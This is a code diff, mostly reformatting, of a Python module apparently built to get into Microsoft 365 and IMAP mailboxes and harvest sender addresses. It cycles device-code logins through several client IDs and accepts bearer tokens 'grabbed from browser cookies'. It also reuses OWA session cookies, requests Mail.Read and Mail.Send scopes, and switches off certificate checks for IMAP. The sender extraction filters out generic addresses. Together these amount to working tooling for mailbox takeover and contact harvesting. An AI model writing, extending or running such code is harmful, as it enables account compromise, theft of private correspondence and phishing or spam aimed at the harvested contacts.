+        auth = f"https://login.microsoftonline.com/{tenant}"
         scopes = ["Mail.Read", "Mail.Send", "User.Read"]
         try:
-            app  = _msal.PublicClientApplication(custom_client_id, authority=auth)
+            app = _msal.PublicClientApplication(custom_client_id, authority=auth)
             flow = app.initiate_device_flow(scopes=scopes)
             if "user_code" not in flow:
-                log.warning("[B2B] custom app device flow failed: %s", flow.get("error_description",""))
+                log.warning(
+                    "[B2B] custom app device flow failed: %s",
+                    flow.get("error_description", ""),
+                )
                 return None
-            state["device_flow"]  = flow
-            state["device_app"]   = app
+            state["device_flow"] = flow
+            state["device_app"] = app
             state["device_email"] = email_addr
-            flow["client_id"]     = custom_client_id
-            flow["_tenant"]       = tenant
+            flow["client_id"] = custom_client_id
+            flow["_tenant"] = tenant
             log.info("[B2B] device code via custom app/%s for %s", tenant, email_addr)
             return {
-                "user_code":        flow["user_code"],
-                "verification_uri": flow.get("verification_uri", "https://microsoft.com/devicelogin"),
-                "app":              "Custom App",
-                "expires_in":       flow.get("expires_in", 900),
+                "user_code": flow["user_code"],
+                "verification_uri": flow.get(
+                    "verification_uri", "https://microsoft.com/devicelogin"
+                ),
+                "app": "Custom App",
+                "expires_in": flow.get("expires_in", 900),
             }
         except Exception as e:
             log.warning("[B2B] custom app device flow error: %s", e)
@@ -782,22 +1036,30 @@ def start_device_code(email_addr: str, state: dict,
         for auth in authorities:
             for scopes in scope_sets:
                 try:
-                    app  = _msal.PublicClientApplication(cid, authority=auth)
+                    app = _msal.PublicClientApplication(cid, authority=auth)
                     flow = app.initiate_device_flow(scopes=scopes)
                     if "user_code" not in flow:
-                        log.debug("[B2B] device code %s/%s no user_code, skipping", app_name, auth)
+                        log.debug(
+                            "[B2B] device code %s/%s no user_code, skipping",
+                            app_name,
+                            auth,
+                        )
                         continue
-                    state["device_flow"]  = flow
-                    state["device_app"]   = app
+                    state["device_flow"] = flow
+                    state["device_app"] = app
                     state["device_email"] = email_addr
-                    flow["client_id"]     = cid
-                    flow["_tenant"]       = auth.split("/")[-1]  # "organizations" or "common" or "consumers"
-                    log.info("[B2B] device code via %s/%s for %s", app_name, auth, email_addr)
+                    flow["client_id"] = cid
+                    flow["_tenant"] = auth.split("/")[
+                        -1
+                    ]  # "organizations" or "common" or "consumers"
+                    log.info(
+                        "[B2B] device code via %s/%s for %s", app_name, auth, email_addr
+                    )
                     return {
-                        "user_code":        flow["user_code"],
+                        "user_code": flow["user_code"],
                         "verification_uri": flow["verification_uri"],
-                        "app":              app_name,
-                        "expires_in":       flow.get("expires_in", 900),
+                        "app": app_name,
+                        "expires_in": flow.get("expires_in", 900),
                     }
                 except Exception as exc:
                     log.debug("[B2B] device code %s/%s failed: %s", app_name, auth, exc)
@@ -807,63 +1069,96 @@ def start_device_code(email_addr: str, state: dict,
 
 def poll_device_code(state: dict) -> dict:
     flow = state.get("device_flow")
-    app  = state.get("device_app")
+    app = state.get("device_app")
     if not flow or not app:
         if state.get("ms_token"):
-            return {"ok": True, "token": state["ms_token"], "expires": state.get("ms_token_expires", 0)}
+            return {
+                "ok": True,
+                "token": state["ms_token"],
+                "expires": state.get("ms_token_expires", 0),
+            }
         return {"ok": False, "waiting": True}
 
     # Get client_id and device_code directly from flow dict
-    client_id   = flow.get("client_id") or getattr(app, "_client_id", None) or getattr(app, "client_id", None)
+    client_id = (
+        flow.get("client_id")
+        or getattr(app, "_client_id", None)
+        or getattr(app, "client_id", None)
+    )
     device_code = flow.get("device_code")
     # Get tenant from the verification_uri authority or stored in flow
-    tenant      = flow.get("_tenant", "organizations")
+    tenant = flow.get("_tenant", "organizations")
 
-    log.debug("[B2B] poll direct: client_id=%s device_code=%s tenant=%s", client_id, device_code[:8] if device_code else None, tenant)
+    log.debug(
+        "[B2B] poll direct: client_id=%s device_code=%s tenant=%s",
+        client_id,
+        device_code[:8] if device_code else None,
+        tenant,
+    )
 
     if not client_id or not device_code:
-        log.warning("[B2B] poll: missing client_id or device_code — client_id=%s code=%s", client_id, bool(device_code))
+        log.warning(
+            "[B2B] poll: missing client_id or device_code — client_id=%s code=%s",
+            client_id,
+            bool(device_code),
+        )
         return {"ok": False, "waiting": True}
 
     try:
         import requests as _r
+
         token_url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
-        resp = _r.post(token_url, data={
-            "grant_type":  "urn:ietf:params:oauth:grant-type:device_code",
-            "client_id":   client_id,
-            "device_code": device_code,
-        }, timeout=8)
+        resp = _r.post(
+            token_url,
+            data={
+                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+                "client_id": client_id,
+                "device_code": device_code,
+            },
+            timeout=8,
+        )
         res = resp.json()
-        log.debug("[B2B] poll token response: %s", {k:v for k,v in res.items() if k != "access_token"})
+        log.debug(
+            "[B2B] poll token response: %s",
+            {k: v for k, v in res.items() if k != "access_token"},
+        )
     except Exception as e:
         log.warning("[B2B] poll direct HTTP failed: %s", e)
         return {"ok": False, "waiting": True}
 
     if "access_token" in res:
-        token  = res["access_token"]
+        token = res["access_token"]
         rtoken = res.get("refresh_token")
-        exp    = time.time() + int(res.get("expires_in", 3600))
+        exp = time.time() + int(res.get("expires_in", 3600))
         granted_scopes = res.get("scope", "")
-        log.info("[B2B] device code auth completed for %s — scopes: %s", state.get("device_email", "?"), granted_scopes)
-        state["ms_token"]         = token
+        log.info(
+            "[B2B] device code auth completed for %s — scopes: %s",
+            state.get("device_email", "?"),
+            granted_scopes,
+        )
+        state["ms_token"] = token
         state["ms_refresh_token"] = rtoken
         state["ms_token_expires"] = exp
-        state["device_flow"]      = None
-        state["device_app"]       = None
+        state["device_flow"] = None
+        state["device_app"] = None
         return {"ok": True, "token": token, "expires": exp}
 
-    err      = res.get("error", "")
+    err = res.get("error", "")
     err_desc = res.get("error_description", err)
 
     if err in ("authorization_pending", "slow_down"):
         return {"ok": False, "waiting": True}
     if err in ("code_expired", "expired_token"):
         state["device_flow"] = None
-        state["device_app"]  = None
+        state["device_app"] = None
         return {"ok": False, "error": "Code expired — start a new login"}
     if "54005" in err_desc or "already redeemed" in err_desc.lower():
         if state.get("ms_token"):
-            return {"ok": True, "token": state["ms_token"], "expires": state.get("ms_token_expires", 0)}
+            return {
+                "ok": True,
+                "token": state["ms_token"],
+                "expires": state.get("ms_token_expires", 0),
+            }
         return {"ok": False, "waiting": True}
 
     log.warning("[B2B] device poll unexpected error: %s — %s", err, err_desc[:200])
@@ -874,68 +1169,86 @@ def poll_device_code(state: dict) -> dict:
 # AUTHENTICATION — METHOD 4: OAUTH2 AUTH CODE (Azure App)
 # ═══════════════════════════════════════════════════════════════
 
-def build_oauth_url(client_id: str, redirect_uri: str, tenant: str = "organizations",
-                    state: str = "") -> str:
+
+def build_oauth_url(
+    client_id: str, redirect_uri: str, tenant: str = "organizations", state: str = ""
+) -> str:
     """
     Build the Microsoft OAuth2 authorize URL.
     User visits this URL, signs in (MFA fine), gets redirected back with ?code=...
     """
     from urllib.parse import urlencode
-    scopes = " ".join([
-        "https://graph.microsoft.com/Mail.Read",
-        "https://graph.microsoft.com/Mail.Send",
-        "https://graph.microsoft.com/User.Read",
-        "offline_access",
-    ])
+
+    scopes = " ".join(
+        [
+            "https://graph.microsoft.com/Mail.Read",
+            "https://graph.microsoft.com/Mail.Send",
+            "https://graph.microsoft.com/User.Read",
+            "offline_access",
+        ]
+    )
     params = {
-        "client_id":     client_id,
+        "client_id": client_id,
         "response_type": "code",
-        "redirect_uri":  redirect_uri,
-        "scope":         scopes,
+        "redirect_uri": redirect_uri,
+        "scope": scopes,
         "response_mode": "query",
-        "state":         state or "synthtel",
-        "prompt":        "select_account",
+        "state": state or "synthtel",
+        "prompt": "select_account",
     }
     return f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize?{urlencode(params)}"
 
 
-def exchange_oauth_code(client_id: str, client_secret: str, redirect_uri: str,
-                        code: str, tenant: str = "organizations") -> dict:
+def exchange_oauth_code(
+    client_id: str,
+    client_secret: str,
+    redirect_uri: str,
+    code: str,
+    tenant: str = "organizations",
+) -> dict:
     """
     Exchange auth code for access + refresh token.
     Returns {"access_token": ..., "refresh_token": ..., "expires_in": ...}
     or {"error": ..., "error_description": ...}
     """
     if not _HAS_REQUESTS:
-        return {"error": "requests_missing", "error_description": "requests not installed"}
-    from urllib.parse import urlencode
-    scopes = " ".join([
-        "https://graph.microsoft.com/Mail.Read",
-        "https://graph.microsoft.com/Mail.Send",
-        "https://graph.microsoft.com/User.Read",
-        "offline_access",
-    ])
+        return {
+            "error": "requests_missing",
+            "error_description": "requests not installed",
+        }
+    scopes = " ".join(
+        [
+            "https://graph.microsoft.com/Mail.Read",
+            "https://graph.microsoft.com/Mail.Send",
+            "https://graph.microsoft.com/User.Read",
+            "offline_access",
+        ]
+    )
     data = {
-        "client_id":     client_id,
+        "client_id": client_id,
         "client_secret": client_secret,
-        "redirect_uri":  redirect_uri,
-        "grant_type":    "authorization_code",
-        "code":          code,
-        "scope":         scopes,
+        "redirect_uri": redirect_uri,
+        "grant_type": "authorization_code",
+        "code": code,
+        "scope": scopes,
     }
     try:
         resp = _req.post(
             f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
-            data=data, timeout=20
+            data=data,
+            timeout=20,
         )
         return resp.json()
     except Exception as e:
         return {"error": "request_failed", "error_description": str(e)}
 
+
 # ═══════════════════════════════════════════════════════════════
 
-def login_token(email_addr: str, token: str, state: dict,
-                expires_in: int = 3600) -> dict:
+
+def login_token(
+    email_addr: str, token: str, state: dict, expires_in: int = 3600
+) -> dict:
     """
     Accept a pre-obtained Bearer token — e.g. grabbed from browser
     cookies, captured from another OAuth flow, or injected by the UI.
@@ -949,51 +1262,76 @@ def login_token(email_addr: str, token: str, state: dict,
         return {"ok": False, "error": "requests not installed"}
     try:
         # Strip "Bearer " prefix and any whitespace/newlines
-        token = re.sub(r'\s+', '', token.strip())
+        token = re.sub(r"\s+", "", token.strip())
         if token.lower().startswith("bearer"):
-            token = re.sub(r'^[Bb]earer', '', token).strip()
+            token = re.sub(r"^[Bb]earer", "", token).strip()
 
         # If pasted text is JSON or a JSON fragment, try to extract the actual token
         if not token.startswith("eyJ"):
             # Try valid JSON first
             try:
                 import json as _jmod
+
                 _j = _jmod.loads(token)
-                _tok = (_j.get("access_token") or _j.get("accessToken")
-                        or _j.get("Token") or _j.get("token") or "")
+                _tok = (
+                    _j.get("access_token")
+                    or _j.get("accessToken")
+                    or _j.get("Token")
+                    or _j.get("token")
+                    or ""
+                )
                 if _tok and _tok.startswith("eyJ"):
-                    token = re.sub(r'\s+', '', _tok)
+                    token = re.sub(r"\s+", "", _tok)
             except Exception:
                 pass
             # Scan for embedded JWT (eyJ...) even in fragments
             if not token.startswith("eyJ"):
-                _m = re.search(r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*', token)
+                _m = re.search(
+                    r"eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*", token
+                )
                 if _m:
                     token = _m.group(0)
 
         if not token.startswith("eyJ"):
-            return {"ok": False, "error": (
-                "Paste just the access token (starts with eyJ…), not a JSON response.\n"
-                "Tip: use the Token Extractor script from the Auth Tips panel — "
-                "it copies the correct token from your browser automatically."
-            )}
+            return {
+                "ok": False,
+                "error": (
+                    "Paste just the access token (starts with eyJ…), not a JSON response.\n"
+                    "Tip: use the Token Extractor script from the Auth Tips panel — "
+                    "it copies the correct token from your browser automatically."
+                ),
+            }
 
-        h   = {"Authorization": f"Bearer {token}"}
-        me  = _req.get(f"{GRAPH}/me?$select=displayName,mail,userPrincipalName",
-                       headers=h, timeout=10)
+        h = {"Authorization": f"Bearer {token}"}
+        me = _req.get(
+            f"{GRAPH}/me?$select=displayName,mail,userPrincipalName",
+            headers=h,
+            timeout=10,
+        )
         if me.status_code == 401:
             # Detect EWS/Exchange tokens (audience 0ff1-ce00) — common mistake
             try:
-                import base64 as _b64, json as _jmod2
-                _payload = _b64.b64decode(token.split('.')[1] + '==').decode('utf-8', errors='replace')
-                _claims  = _jmod2.loads(_payload)
-                _aud     = _claims.get('aud', '')
-                if '0ff1-ce00' in _aud or 'outlook.office' in _aud or 'exchange' in _aud.lower():
-                    return {"ok": False, "error": (
-                        "This is an EWS/Outlook token, not a Microsoft Graph token. "
-                        "Graph tokens have audience 'https://graph.microsoft.com'. "
-                        "Use the Token Extractor script — it finds the correct Graph token automatically."
-                    )}
+                import base64 as _b64
+                import json as _jmod2
+
+                _payload = _b64.b64decode(token.split(".")[1] + "==").decode(
+                    "utf-8", errors="replace"
+                )
+                _claims = _jmod2.loads(_payload)
+                _aud = _claims.get("aud", "")
+                if (
+                    "0ff1-ce00" in _aud
+                    or "outlook.office" in _aud
+                    or "exchange" in _aud.lower()
+                ):
+                    return {
+                        "ok": False,
+                        "error": (
+                            "This is an EWS/Outlook token, not a Microsoft Graph token. "
+                            "Graph tokens have audience 'https://graph.microsoft.com'. "
+                            "Use the Token Extractor script — it finds the correct Graph token automatically."
+                        ),
+                    }
             except Exception:
                 pass
             return {"ok": False, "error": "Token rejected — invalid or expired"}
@@ -1003,28 +1341,32 @@ def login_token(email_addr: str, token: str, state: dict,
         # Verify mail access
         chk = _req.get(
             f"{GRAPH}/me/mailFolders/Inbox?$select=totalItemCount",
-            headers=h, timeout=10,
+            headers=h,
+            timeout=10,
         )
         if chk.status_code == 403:
             return {"ok": False, "error": "Token valid but missing Mail.Read scope"}
         count = chk.json().get("totalItemCount", 0) if chk.ok else 0
 
-        state["ms_token"]         = token
+        state["ms_token"] = token
         state["ms_refresh_token"] = None
         state["ms_token_expires"] = time.time() + expires_in
-        state["email"]            = email_addr or info.get("mail") or info.get("userPrincipalName", "")
+        state["email"] = (
+            email_addr or info.get("mail") or info.get("userPrincipalName", "")
+        )
         log.info("[B2B] token login OK for %s", state["email"])
         return {
-            "ok":           True,
+            "ok": True,
             "display_name": info.get("displayName", ""),
-            "inbox_count":  count,
+            "inbox_count": count,
         }
     except Exception as exc:
         return {"ok": False, "error": str(exc)[:200]}
 
 
-def exchange_refresh_token(refresh_token: str, client_id: str,
-                           tenant: str = "common") -> tuple:
+def exchange_refresh_token(
+    refresh_token: str, client_id: str, tenant: str = "common"
+) -> tuple:
     """
     Exchange a refresh token for a new access token via direct HTTP.
     Does not require MSAL.
@@ -1036,10 +1378,10 @@ def exchange_refresh_token(refresh_token: str, client_id: str,
         resp = _req.post(
             f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
             data={
-                "grant_type":    "refresh_token",
-                "client_id":     client_id,
+                "grant_type": "refresh_token",
+                "client_id": client_id,
                 "refresh_token": refresh_token,
-                "scope":         "https://graph.microsoft.com/.default offline_access",
+                "scope": "https://graph.microsoft.com/.default offline_access",
             },
             timeout=15,
         )
@@ -1051,7 +1393,9 @@ def exchange_refresh_token(refresh_token: str, client_id: str,
                 time.time() + int(res.get("expires_in", 3600)),
                 None,
             )
-        err = res.get("error", "unknown") + ": " + res.get("error_description", "")[:200]
+        err = (
+            res.get("error", "unknown") + ": " + res.get("error_description", "")[:200]
+        )
         return None, None, 0, err
     except Exception as e:
         return None, None, 0, str(e)[:200]
@@ -1060,6 +1404,7 @@ def exchange_refresh_token(refresh_token: str, client_id: str,
 # ═══════════════════════════════════════════════════════════════
 # AUTHENTICATION — IMAP LOGIN (Gmail / GoDaddy / any IMAP)
 # ═══════════════════════════════════════════════════════════════
+
 
 def login_imap(prov: dict, email_addr: str, password: str) -> tuple:
     """
@@ -1079,14 +1424,14 @@ def login_imap(prov: dict, email_addr: str, password: str) -> tuple:
         (None, "auth_failed: ...")            wrong credentials
         (None, "connection_failed: ...")      can't reach server
     """
-    host     = prov.get("imap_host", "")
-    port     = int(prov.get("imap_port", 993))
-    domain   = prov.get("domain", "")
+    host = prov.get("imap_host", "")
+    port = int(prov.get("imap_port", 993))
+    domain = prov.get("domain", "")
     is_godaddy = prov.get("is_godaddy", False)
 
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
-    ctx.verify_mode    = ssl.CERT_NONE   # permissive — some corp certs are self-signed
+    ctx.verify_mode = ssl.CERT_NONE  # permissive — some corp certs are self-signed
 
     def _try_ssl(h: str, p: int, user: str, pw: str):
         try:
@@ -1115,11 +1460,20 @@ def login_imap(prov: dict, email_addr: str, password: str) -> tuple:
             return None, str(exc)
 
     def _is_auth_error(e: str) -> bool:
-        return any(x in e.lower() for x in [
-            "authentication", "credentials", "auth", "login failed",
-            "authenticationfailed", "[auth]", "too many login",
-            "invalid password", "wrong password",
-        ])
+        return any(
+            x in e.lower()
+            for x in [
+                "authentication",
+                "credentials",
+                "auth",
+                "login failed",
+                "authenticationfailed",
+                "[auth]",
+                "too many login",
+                "invalid password",
+                "wrong password",
+            ]
+        )
 
     # --- Attempt 1: primary host + SSL ---
     conn, err = _try_ssl(host, port, email_addr, password)
@@ -1165,6 +1519,7 @@ def login_imap(prov: dict, email_addr: str, password: str) -> tuple:
 # FOLDER LISTING
 # ═══════════════════════════════════════════════════════════════
 
+
 def list_folders_ms(token: str) -> list:
     """
     Return all MS Graph mail folders with message counts.
@@ -1172,9 +1527,9 @@ def list_folders_ms(token: str) -> list:
     """
     if not _HAS_REQUESTS:
         return []
-    h       = {"Authorization": f"Bearer {token}"}
+    h = {"Authorization": f"Bearer {token}"}
     folders = []
-    url     = f"{GRAPH}/me/mailFolders?$select=displayName,totalItemCount,id&$top=50&$includeHiddenFolders=false"
+    url = f"{GRAPH}/me/mailFolders?$select=displayName,totalItemCount,id&$top=50&$includeHiddenFolders=false"
     while url:
         try:
             r = _req.get(url, headers=h, timeout=15)
@@ -1183,22 +1538,26 @@ def list_folders_ms(token: str) -> list:
                 break
             d = r.json()
             for f in d.get("value", []):
-                folders.append({
-                    "id":    f["id"],
-                    "name":  f["displayName"],
-                    "count": f.get("totalItemCount", 0),
-                })
+                folders.append(
+                    {
+                        "id": f["id"],
+                        "name": f["displayName"],
+                        "count": f.get("totalItemCount", 0),
+                    }
+                )
                 # Fetch child folders
                 child_url = f"{GRAPH}/me/mailFolders/{f['id']}/childFolders?$select=displayName,totalItemCount,id&$top=50"
                 try:
                     cr = _req.get(child_url, headers=h, timeout=10)
                     if cr.ok:
                         for cf in cr.json().get("value", []):
-                            folders.append({
-                                "id":    cf["id"],
-                                "name":  f"{f['displayName']} / {cf['displayName']}",
-                                "count": cf.get("totalItemCount", 0),
-                            })
+                            folders.append(
+                                {
+                                    "id": cf["id"],
+                                    "name": f"{f['displayName']} / {cf['displayName']}",
+                                    "count": cf.get("totalItemCount", 0),
+                                }
+                            )
                 except Exception:
                     pass
             url = d.get("@odata.nextLink")
@@ -1222,13 +1581,16 @@ def list_folders_imap(conn: imaplib.IMAP4) -> list:
             if not item:
                 continue
             try:
-                raw = (item.decode("utf-8", errors="replace")
-                       if isinstance(item, bytes) else str(item))
+                raw = (
+                    item.decode("utf-8", errors="replace")
+                    if isinstance(item, bytes)
+                    else str(item)
+                )
                 # IMAP LIST: (\Flag \Flag) "/" "Folder Name"
                 # Name may or may not be quoted
                 m = re.search(r'\s"([^"]+)"\s*$', raw)
                 if not m:
-                    m = re.search(r'\s(/|NIL)\s+(.+)$', raw)
+                    m = re.search(r"\s(/|NIL)\s+(.+)$", raw)
                     name = m.group(2).strip('" ') if m else ""
                 else:
                     name = m.group(1)
@@ -1237,13 +1599,24 @@ def list_folders_imap(conn: imaplib.IMAP4) -> list:
                     continue
                 try:
                     s2, cnt_data = conn.status(f'"{name}"', "(MESSAGES)")
-                    raw_cnt = (cnt_data[0] or b"").decode(errors="replace") if isinstance(cnt_data[0], bytes) else str(cnt_data[0] or "")
+                    raw_cnt = (
+                        (cnt_data[0] or b"").decode(errors="replace")
+                        if isinstance(cnt_data[0], bytes)
+                        else str(cnt_data[0] or "")
+                    )
                     cnt_m = re.search(r"MESSAGES (\d+)", raw_cnt)
                     count = int(cnt_m.group(1)) if cnt_m else 0
                 except Exception:
                     count = 0
-                folders.append({"id": name, "name": name, "count": count,
-                                 "displayName": name, "totalItemCount": count})
+                folders.append(
+                    {
+                        "id": name,
+                        "name": name,
+                        "count": count,
+                        "displayName": name,
+                        "totalItemCount": count,
+                    }
+                )
             except Exception:
                 continue
     except Exception as exc:
@@ -1253,13 +1626,13 @@ def list_folders_imap(conn: imaplib.IMAP4) -> list:
 
 # Standard O365 folder names used as fallback when no token/conn available
 _O365_STANDARD_FOLDERS = [
-    ("Inbox",          "inbox",          "Inbox"),
-    ("Sent Items",     "sentitems",      "SentItems"),
-    ("Deleted Items",  "deleteditems",   "DeletedItems"),
-    ("Junk Email",     "junkemail",      "JunkEmail"),
-    ("Drafts",         "drafts",         "Drafts"),
-    ("Archive",        "archive",        "Archive"),
-    ("Clutter",        "clutter",        "Clutter"),
+    ("Inbox", "inbox", "Inbox"),
+    ("Sent Items", "sentitems", "SentItems"),
+    ("Deleted Items", "deleteditems", "DeletedItems"),
+    ("Junk Email", "junkemail", "JunkEmail"),
+    ("Drafts", "drafts", "Drafts"),
+    ("Archive", "archive", "Archive"),
+    ("Clutter", "clutter", "Clutter"),
 ]
 
 
@@ -1279,19 +1652,24 @@ def list_folders_owa(session) -> list:
     try:
         r = session.get(
             f"{GRAPH}/me/mailFolders?$select=displayName,totalItemCount,id&$top=50",
-            headers=h_base, timeout=15,
+            headers=h_base,
+            timeout=15,
         )
         if r.ok:
             folders = []
             for f in r.json().get("value", []):
-                folders.append({
-                    "id":             f.get("id", f.get("displayName","")),
-                    "name":           f.get("displayName",""),
-                    "displayName":    f.get("displayName",""),
-                    "totalItemCount": f.get("totalItemCount", 0),
-                })
+                folders.append(
+                    {
+                        "id": f.get("id", f.get("displayName", "")),
+                        "name": f.get("displayName", ""),
+                        "displayName": f.get("displayName", ""),
+                        "totalItemCount": f.get("totalItemCount", 0),
+                    }
+                )
             if folders:
-                log.info("[B2B] list_folders_owa: Graph returned %d folders", len(folders))
+                log.info(
+                    "[B2B] list_folders_owa: Graph returned %d folders", len(folders)
+                )
                 return sorted(folders, key=lambda x: -x["totalItemCount"])
     except Exception as e:
         log.debug("[B2B] list_folders_owa Graph: %s", e)
@@ -1323,26 +1701,33 @@ def list_folders_owa(session) -> list:
             "https://outlook.office365.com/EWS/Exchange.asmx",
             data=ews_soap,
             headers={
-                "User-Agent":   _UA,
+                "User-Agent": _UA,
                 "Content-Type": "text/xml; charset=utf-8",
-                "SOAPAction":   '"http://schemas.microsoft.com/exchange/services/2006/messages/FindFolder"',
+                "SOAPAction": '"http://schemas.microsoft.com/exchange/services/2006/messages/FindFolder"',
             },
             timeout=20,
         )
         if r.ok and "<m:FindFolderResponse" in r.text:
             folders = []
             for m in re.finditer(
-                r'<t:DisplayName>([^<]+)</t:DisplayName>.*?<t:TotalCount>(\d+)</t:TotalCount>',
-                r.text, re.DOTALL
+                r"<t:DisplayName>([^<]+)</t:DisplayName>.*?<t:TotalCount>(\d+)</t:TotalCount>",
+                r.text,
+                re.DOTALL,
             ):
-                name  = m.group(1).strip()
+                name = m.group(1).strip()
                 count = int(m.group(2))
-                folders.append({
-                    "id": name, "name": name,
-                    "displayName": name, "totalItemCount": count,
-                })
+                folders.append(
+                    {
+                        "id": name,
+                        "name": name,
+                        "displayName": name,
+                        "totalItemCount": count,
+                    }
+                )
             if folders:
-                log.info("[B2B] list_folders_owa: EWS returned %d folders", len(folders))
+                log.info(
+                    "[B2B] list_folders_owa: EWS returned %d folders", len(folders)
+                )
                 return sorted(folders, key=lambda x: -x["totalItemCount"])
     except Exception as e:
         log.debug("[B2B] list_folders_owa EWS: %s", e)
@@ -1357,12 +1742,12 @@ def list_folders_owa(session) -> list:
 
 def extract_owa_session(
     session,
-    folders:        list,
-    limit:          int  = 2000,
+    folders: list,
+    limit: int = 2000,
     filter_generic: bool = True,
-    only_domains:   set  = None,
-    block_domains:  set  = None,
-    days_back:      int  = 90,
+    only_domains: set = None,
+    block_domains: set = None,
+    days_back: int = 90,
 ) -> "Generator":
     """
     Extract sender emails using an OWA HTTP session (cookie auth).
@@ -1372,32 +1757,41 @@ def extract_owa_session(
       3. OWA search scrape — last resort
     """
     import datetime as _dt
-    import json as _json
 
     date_after_dt = _dt.datetime.utcnow() - _dt.timedelta(days=days_back)
-    date_after    = date_after_dt.strftime("%Y-%m-%dT00:00:00Z")
-    seen:  set = set()
+    date_after = date_after_dt.strftime("%Y-%m-%dT00:00:00Z")
+    seen: set = set()
     total: int = 0
 
     GENERIC_RE = re.compile(
-        r'^(noreply|no[-.]reply|donotreply|do-not-reply|info|admin|support|help|'
-        r'contact|sales|billing|newsletter|notifications?|alerts?|automated|mailer|'
-        r'bounce|postmaster|hostmaster|webmaster|abuse|unsubscribe)', re.I
+        r"^(noreply|no[-.]reply|donotreply|do-not-reply|info|admin|support|help|"
+        r"contact|sales|billing|newsletter|notifications?|alerts?|automated|mailer|"
+        r"bounce|postmaster|hostmaster|webmaster|abuse|unsubscribe)",
+        re.I,
     )
 
     folder_map = {
-        "inbox": "inbox", "sent items": "sentitems", "sentitems": "sentitems",
-        "deleted items": "deleteditems", "deleteditems": "deleteditems",
-        "junk email": "junkemail", "junkemail": "junkemail",
-        "drafts": "drafts", "archive": "archive",
+        "inbox": "inbox",
+        "sent items": "sentitems",
+        "sentitems": "sentitems",
+        "deleted items": "deleteditems",
+        "deleteditems": "deleteditems",
+        "junk email": "junkemail",
+        "junkemail": "junkemail",
+        "drafts": "drafts",
+        "archive": "archive",
     }
 
     def _keep(addr):
         addr = addr.strip().lower()
-        if not addr or "@" not in addr or addr in seen: return False
-        if filter_generic and GENERIC_RE.match(addr.split("@")[0]): return False
-        if only_domains and addr.split("@")[-1] not in only_domains: return False
-        if block_domains and addr.split("@")[-1] in block_domains: return False
+        if not addr or "@" not in addr or addr in seen:
+            return False
+        if filter_generic and GENERIC_RE.match(addr.split("@")[0]):
+            return False
+        if only_domains and addr.split("@")[-1] not in only_domains:
+            return False
+        if block_domains and addr.split("@")[-1] in block_domains:
+            return False
         return True
 
     # ── Strategy 1: OWA internal service.svc REST API ─────────────
@@ -1417,7 +1811,10 @@ def extract_owa_session(
 
     canary = _cookie_val("X-OWA-Canary")
     if canary:
-        yield {"type": "progress", "msg": f"OWA canary from cookie ({len(canary)} chars)"}
+        yield {
+            "type": "progress",
+            "msg": f"OWA canary from cookie ({len(canary)} chars)",
+        }
 
     if not canary:
         # Try multiple OWA entry points — new OWA uses outlook.office.com
@@ -1428,17 +1825,26 @@ def extract_owa_session(
         ]
         for _url in _owa_urls:
             try:
-                r_mail = session.get(_url, headers={"User-Agent": _UA,
-                                     "Accept": "text/html,*/*"}, timeout=20,
-                                     allow_redirects=True)
+                r_mail = session.get(
+                    _url,
+                    headers={"User-Agent": _UA, "Accept": "text/html,*/*"},
+                    timeout=20,
+                    allow_redirects=True,
+                )
                 # Check if we landed on OWA (not redirected back to login)
                 if "login.microsoftonline.com" in r_mail.url:
-                    yield {"type": "progress", "msg": f"OWA {_url[-20:]}: redirected to login — cookies need refresh"}
+                    yield {
+                        "type": "progress",
+                        "msg": f"OWA {_url[-20:]}: redirected to login — cookies need refresh",
+                    }
                     continue
                 # Check cookie jar first (may be set during redirect)
                 canary = _cookie_val("X-OWA-Canary")
                 if canary:
-                    yield {"type": "progress", "msg": f"OWA canary from cookie after {_url[-20:]} ({len(canary)} chars)"}
+                    yield {
+                        "type": "progress",
+                        "msg": f"OWA canary from cookie after {_url[-20:]} ({len(canary)} chars)",
+                    }
                     break
                 # Scrape from page HTML — try multiple patterns
                 for _pat in [
@@ -1452,17 +1858,35 @@ def extract_owa_session(
                         canary = _m.group(1)
                         break
                 if canary:
-                    yield {"type": "progress", "msg": f"OWA canary from page HTML ({len(canary)} chars)"}
+                    yield {
+                        "type": "progress",
+                        "msg": f"OWA canary from page HTML ({len(canary)} chars)",
+                    }
                     break
-                yield {"type": "progress", "msg": f"OWA {_url[-20:]}: loaded (status {r_mail.status_code}) but no canary found"}
+                yield {
+                    "type": "progress",
+                    "msg": f"OWA {_url[-20:]}: loaded (status {r_mail.status_code}) but no canary found",
+                }
             except Exception as e:
                 yield {"type": "progress", "msg": f"OWA {_url[-20:]}: {e}"}
         if not canary:
-            yield {"type": "progress", "msg": "No OWA canary found — session cookies may be expired or EWS-only"}
+            yield {
+                "type": "progress",
+                "msg": "No OWA canary found — session cookies may be expired or EWS-only",
+            }
         # Log available cookie names for debugging
-        _cookie_names = [ck.name for ck in session.cookies if "auth" in ck.name.lower() or "canary" in ck.name.lower() or "owa" in ck.name.lower()]
+        _cookie_names = [
+            ck.name
+            for ck in session.cookies
+            if "auth" in ck.name.lower()
+            or "canary" in ck.name.lower()
+            or "owa" in ck.name.lower()
+        ]
         if _cookie_names:
-            yield {"type": "progress", "msg": f"Auth cookies in session: {_cookie_names[:8]}"}
+            yield {
+                "type": "progress",
+                "msg": f"Auth cookies in session: {_cookie_names[:8]}",
+            }
 
     owa_worked = False
 
@@ -1477,12 +1901,12 @@ def extract_owa_session(
     _default_folders = ["inbox", "sentitems", "deleteditems", "junkemail"]
 
     if canary:
-        for folder_ref in (folders or _default_folders):
+        for folder_ref in folders or _default_folders:
             if total >= limit:
                 break
-            folder_id  = folder_map.get(folder_ref.lower(), folder_ref)
+            folder_id = folder_map.get(folder_ref.lower(), folder_ref)
             offset_owa = 0
-            page_size  = 50
+            page_size = 50
             folder_found = 0
 
             while total < limit:
@@ -1493,8 +1917,11 @@ def extract_owa_session(
                         "RequestServerVersion": "Exchange2013",
                         "TimeZoneContext": {
                             "__type": "TimeZoneContext:#Exchange",
-                            "TimeZoneDefinition": {"__type": "TimeZoneDefinitionType:#Exchange", "Id": "UTC"}
-                        }
+                            "TimeZoneDefinition": {
